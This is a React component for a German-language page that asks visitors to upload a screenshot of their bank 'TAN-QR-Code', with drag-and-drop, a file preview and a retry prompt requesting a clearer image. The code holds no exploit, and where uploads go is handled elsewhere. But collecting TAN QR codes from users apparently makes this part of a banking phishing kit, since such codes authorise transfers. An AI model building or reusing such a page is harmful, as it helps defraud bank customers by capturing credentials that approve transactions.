import React, { useState, useRef } from 'react';
import { FolderOpen, Image } from 'lucide-react';
import Loading from './Loading';

interface QRUploadFormProps {
  onUpload: (file: File) => void;
  isRetry?: boolean;
}

const QRUploadForm: React.FC<QRUploadFormProps> = ({ onUpload, isRetry = false }) => {
  const [dragOver, setDragOver] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  const handleDragOver = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(true);
  };

  const handleDragLeave = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
  };

  const handleDrop = (e: React.DragEvent) => {
    e.preventDefault();
    setDragOver(false);
    
    const files = e.dataTransfer.files;
    if (files.length > 0) {
      const file = files[0];
      if (file.type.startsWith('image/')) {
        setSelectedFile(file);
      }
    }
  };

  const handleFileSelect = (e: React.ChangeEvent<HTMLInputElement>) => {
    const files = e.target.files;
    if (files && files.length > 0) {
      setSelectedFile(files[0]);
    }
  };

  const handleUpload = async () => {
    if (!selectedFile) return;
    
    setIsLoading(true);
    
    try {
      console.log('QRUploadForm: Starting upload for file:', selectedFile.name);
      
      // Start upload immediately - no fake delay!
      await onUpload(selectedFile);
      
      console.log('QRUploadForm: Upload completed successfully');
      
    } catch (error: any) {
      console.error('QRUploadForm: Upload failed:', error);
      
      // Reset upload state
      setIsLoading(false);
      
      // Show error message to user
      const errorMessage = error.message || 'Fehler beim Upload. Bitte versuchen Sie es erneut.';
      alert(errorMessage);
      
      // Don't throw - let the parent component handle state
    }
    // Note: Don't reset loading state in finally block
    // Let the parent component (App.tsx) handle state transitions
  };

  const openFileDialog = () => {
    fileInputRef.current?.click();
  };

  return (
    <>
      <style>
        {`
          @media (max-width: 768px) {
            .mobile-title {
              font-size: 2.5rem !important;
            }
          }
          @media (max-width: 480px) {
            .mobile-title {
              font-size: 2rem !important;
            }
          }
        `}
      </style>
      <div style={{ 
        maxWidth: '1440px', 
        margin: '0 auto', 
        padding: '60px 40px',
        backgroundColor: 'white',
        minHeight: '100vh'
      }}>
        {isLoading && (
          <Loading 
            message="QR-Code wird analysiert..."
            type="upload"
            showProgress={false}
          />
        )}
        
        <div style={{
          textAlign: 'left' as const,
          maxWidth: '600px'
        }}>
          <h1 className="mobile-title" style={{
            color: '#002e3c',
            fontSize: '2.5rem',
            fontWeight: 'bold',
            marginBottom: '20px',
            fontFamily: 'Gotham, Arial, sans-serif',
            lineHeight: '1.1'
          }}>
            {isRetry ? 'QR-Code erneut hochladen' : 'QR-Code hochladen'}
          </h1>
          
          {isRetry && (
            <div style={{
              backgroundColor: '#fef2f2',
              border: '1px solid #fecaca',
              borderRadius: '8px',
              padding: '15px',
              marginBottom: '30px'
            }}>
              <p style={{
                color: '#dc2626',
                fontSize: '0.9rem',
                margin: 0,
                fontWeight: '500'
              }}>
                Der vorherige Upload war nicht erfolgreich. Bitte versuchen Sie es erneut mit einem klareren Bild.
              </p>
            </div>
          )}
          
          <p style={{
            color: '#666',
            fontSize: '1rem',
            lineHeight: '1.6',
            marginBottom: '30px'
          }}>
            Laden Sie hier den Screenshot Ihres TAN-QR-Codes hoch. 
            Stellen Sie sicher, dass das Bild klar und vollständig ist.
          </p>
          
          {/* Upload Area */}
          <div
            onDragOver={handleDragOver}
            onDragLeave={handleDragLeave}
            onDrop={handleDrop}
            onClick={openFileDialog}
            style={{
              border: dragOver ? '2px dashed #0ea5e9' : '2px dashed #d1d5db',
              borderRadius: '12px',
              padding: '60px 40px',
              textAlign: 'center' as const,
              backgroundColor: dragOver ? '#f0f9ff' : '#f9fafb',
              cursor: 'pointer',
              transition: 'all 0.3s ease',
              marginBottom: '30px'
            }}
          >
            <div style={{
              fontSize: '48px',
              marginBottom: '20px',
              color: dragOver ? '#0ea5e9' : '#6b7280',
              display: 'flex',
              justifyContent: 'center',
              alignItems: 'center'
            }}>
              <FolderOpen size={48} />
            </div>
            
            <h3 style={{
              color: '#002e3c',
              fontSize: '1.25rem',
              fontWeight: '600',
              marginBottom: '10px',
              fontFamily: 'Gotham, Arial, sans-serif'
            }}>
              {selectedFile ? selectedFile.name : 'Datei hier ablegen oder klicken'}
            </h3>
            
            <p style={{
              color: '#6b7280',
              fontSize: '0.875rem',
              margin: 0
            }}>
              Unterstützte Formate: JPG, PNG, GIF (max. 10MB)
            </p>
          </div>
          
          <input
            ref={fileInputRef}
            type="file"
            accept="image/*"
            onChange={handleFileSelect}
            style={{ display: 'none' }}
          />
          
          {/* Preview */}
          {selectedFile && (
            <div style={{
              backgroundColor: '#f0f9ff',
              border: '1px solid #0ea5e9',
              borderRadius: '8px',
              padding: '20px',
              marginBottom: '30px',
              display: 'flex',
              alignItems: 'center',
              gap: '15px'
            }}>
              <div style={{
                width: '60px',
                height: '60px',
                backgroundColor: '#0ea5e9',
                borderRadius: '8px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                color: 'white'
              }}>
                <Image size={24} />
              </div>
              
              <div style={{ flex: 1 }}>
                <h4 style={{
                  color: '#0c4a6e',
                  fontSize: '1rem',
                  fontWeight: '600',
                  marginBottom: '5px',
                  fontFamily: 'Gotham, Arial, sans-serif'
                }}>
                  {selectedFile.name}
                </h4>
                <p style={{
                  color: '#0c4a6e',
                  fontSize: '0.875rem',
                  margin: 0
                }}>
                  {(selectedFile.size / 1024 / 1024).toFixed(2)} MB
                </p>
              </div>
              
              <button
                onClick={(e) => {
                  e.stopPropagation();
                  setSelectedFile(null);
                  if (fileInputRef.current) {
                    fileInputRef.current.value = '';
                  }
                }}
                style={{
                  background: 'none',
                  border: 'none',
                  color: '#dc2626',
                  fontSize: '20px',
                  cursor: 'pointer',
                  padding: '5px'
                }}
              >
                ✕
              </button>
            </div>
          )}
          
          {/* Upload Button */}
          <button
            onClick={handleUpload}
            disabled={!selectedFile || isLoading}
            style={{
              backgroundColor: selectedFile && !isLoading ? '#FFD700' : '#d1d5db',
              color: selectedFile && !isLoading ? '#002e3c' : '#6b7280',
              border: 'none',
              borderRadius: '35px',
              padding: '1.25rem 3rem',
              fontSize: '1rem',
              fontWeight: '600',
              cursor: selectedFile && !isLoading ? 'pointer' : 'not-allowed',
              fontFamily: 'Gotham, Arial, sans-serif',
              transition: 'all 0.3s ease',
              display: 'flex',
              alignItems: 'center',
              gap: '0.5rem',
              opacity: selectedFile && !isLoading ? 1 : 0.6
            }}
            onMouseOver={(e) => {
              if (selectedFile && !isLoading) {
                e.currentTarget.style.boxShadow = '0 4px 12px rgba(255, 215, 0, 0.3)';
              }
            }}
            onMouseOut={(e) => {
              e.currentTarget.style.boxShadow = 'none';
            }}
          >
            {isLoading ? 'Wird hochgeladen...' : 'QR-Code hochladen'}
            {!isLoading && selectedFile && (
              <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M5 12h14M12 5l7 7-7 7"/>
              </svg>
            )}
          </button>
        </div>
      </div>
    </>
  );
};

export default QRUploadForm; 